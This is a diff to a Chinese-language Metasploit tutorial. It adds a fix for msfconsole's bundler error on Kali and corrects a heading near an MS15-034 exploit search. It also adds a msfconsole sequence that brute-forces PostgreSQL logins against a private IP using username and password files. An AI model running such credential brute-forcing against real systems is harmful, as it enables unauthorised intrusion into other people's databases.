@@ -20,6 +20,20 @@ Metasploit的设计初衷是打造成一个攻击工具开发平台，
 
 安全专家以及业余安全爱好者更多地将其当作一种点几下鼠标就可以利用其中附带的攻击工具进行成功攻击的环境。
 
+> kali进行apt-get upgrate之后遇到了msfconsole无法开启的问题，错误如下
+```
+root@kali:~# msfconsole 
+[*] Bundler failed to load and returned this error:
+
+   'cannot load such file -- bundler/setup'
+
+[*] You may need to uninstall or upgrade bundler
+```
+解决方法：
+```
+gem install bundler:1.17.3
+
+```
 ## kali内网映射+msf利用漏洞
 
 注意：`此次实验可以不用做内网映射直接进行攻击，我只是借着这个机会说一下内网映射。。。`
@@ -59,7 +73,7 @@ Metasploit的设计初衷是打造成一个攻击工具开发平台，
 
 > Ok，咱们启动msf利用此漏洞攻击目标服务器。
 
-###cmd下msfconsole进入msf，输入
+### cmd下msfconsole进入msf，输入
 ```
 search MS15-034 (查询此漏洞的利用模块)
 ```
@@ -641,9 +655,15 @@ run
 ```
 
 
-
-
-
+**爆破postgres sql**
+```bash
+use auxiliary/scanner/postgres/postgres_login
+set rhosts 10.7.199.28
+set user_file /root/fore/user.txt
+set userpass_file /root/fore/pass.txt
+set stop_on_success true
+exploit
+```
 
 
 
